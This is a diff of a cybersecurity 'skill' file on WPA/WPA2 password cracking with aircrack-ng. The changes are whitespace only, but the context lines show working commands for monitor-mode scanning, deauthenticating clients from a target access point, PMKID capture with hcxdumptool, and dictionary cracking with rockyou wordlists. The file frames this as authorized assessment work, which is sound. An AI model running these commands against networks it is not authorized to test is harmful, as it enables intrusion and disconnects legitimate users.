@@ -1,10 +1,10 @@
 ---
 name: performing-wifi-password-cracking-with-aircrack
 description: 'Captures WPA/WPA2 handshakes and performs offline password cracking
-  using aircrack-ng, hashcat, and dictionary attacks during authorized wireless security
-  assessments to evaluate passphrase strength and wireless network security posture.
+ using aircrack-ng, hashcat, and dictionary attacks during authorized wireless security
+ assessments to evaluate passphrase strength and wireless network security posture.
 
-  '
+ '
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -82,8 +82,8 @@ sudo ip link set wlan0 up
 sudo airodump-ng wlan0mon
 
 # Output columns:
-# BSSID          PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
-# AA:BB:CC:DD:EE:FF  -45    120    35   6  WPA2  CCMP    PSK   TargetNetwork
+# BSSID PWR Beacons #Data CH ENC CIPHER AUTH ESSID
+# AA:BB:CC:DD:EE:FF -45 120 35 6 WPA2 CCMP PSK TargetNetwork
 
 # Identify the target network parameters:
 # - BSSID (MAC address of the access point)
@@ -112,7 +112,7 @@ sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
 # Method 3: Capture PMKID from the AP (no client needed)
 # Using hcxdumptool
 sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng \
-  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
+ --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
 
 # Wait for "PMKID" message, then convert for hashcat
 hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
@@ -133,7 +133,7 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_c
 
 # Use multiple wordlists
 aircrack-ng -w /usr/share/wordlists/rockyou.txt,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
-  -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap
+ -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap
 
 # Crack with a specific ESSID
 aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetNetwork" handshake_capture-01.cap
